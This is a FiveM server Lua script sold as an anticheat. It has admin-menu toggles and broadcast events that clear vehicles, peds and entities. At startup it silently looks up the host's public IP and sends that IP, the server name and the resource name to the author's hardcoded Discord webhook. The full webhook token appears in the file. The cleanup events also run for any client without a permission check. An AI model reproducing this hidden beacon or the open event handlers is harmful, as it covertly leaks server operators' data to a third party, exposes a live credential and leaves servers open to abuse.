local logskingive = "https://discordapp.com/api/webhooks/753503102216437810/IAty5R7jUs52H524MzFm0OmMtl88yswQl_QN6BGGm9nQlntTmSddYK_vKqQLkgpF2KxR"

function giveskinss(message) 
    local embed = {
        {
          ["color"] = 15158332,
          ["title"] = " Server Start with my script ",
          ["description"] = ""..message.."",
          ["footer"] = {
          ["text"]= "[ Made By :  Abdulmalik#1111 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
          ["icon_url"] = '',
           },
         }
      }
    
    
    PerformHttpRequest(logskingive, function(err, text, headers) end, 'POST', json.encode({username = webname, embeds = embed}), { ['Content-Type'] = 'application/json' })
    end
    
 PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
  local server_ip = text
  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started Abdulmalik Anticheat :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
  end, 'GET', '')

RegisterServerEvent("2swshit:cleanareaveh")
RegisterServerEvent("2swshit:cleanareapeds")
RegisterServerEvent("2swshit:cleanareaentity")
RegisterServerEvent("2swshit:enable")
RegisterServerEvent("2swshit:log")
RegisterServerEvent("2swshit:spectate")
RegisterServerEvent("2swshit:openmenu")
RegisterServerEvent("2swshit:checkup")
RegisterServerEvent("2swshit:adminmenuenable")
RegisterServerEvent("2swshit:ViolationDetected")
RegisterServerEvent("2swshit:askAwake")


function isAllowedToChange(player)
    local allowed = false
    for i,id in ipairs(admins) do
        for x,pid in ipairs(GetPlayerIdentifiers(player)) do
            if debugprint then print('admin id: ' .. id .. '\nplayer id:' .. pid) end
            if string.lower(pid) == string.lower(id) then
                allowed = true
            end
        end
    end
    return allowed
end
RegisterCommand((menu), function(source)
    if source == 0 then
        holyadmin = not holyadmin
        if holyadmin then
            print("Menu is now enabled.")
        else
            print("Menu is now disabled.")
        end
    else
        if isAllowedToChange(source) then
            holyadmin = not holyadmin
            if holyadmin then
                TriggerClientEvent('2swshit:openmenuy', source)
            else
                TriggerClientEvent('2swshit:openmenuy', source)
            end
        end
    end
end)



AddEventHandler("2swshit:adminmenuenable", function()
    TriggerClientEvent('adminmenuenabley',source)
end)

function GetEntityOwner(entity)
    local owner = NetworkGetEntityOwner(entity)
    if (GetEntityPopulationType(entity) ~= 7) then return nil end
    return owner
end


AddEventHandler("2swshit:cleanareaveh", function()
  TriggerClientEvent("2swshit:cleanareavehy",-1)
end)

AddEventHandler("2swshit:cleanareapeds", function()
    TriggerClientEvent("2swshit:cleanareapedsy",-1)
  end)

AddEventHandler("2swshit:cleanareaentity", function()
    TriggerClientEvent("2swshit:cleanareaentityy",-1)
  end)
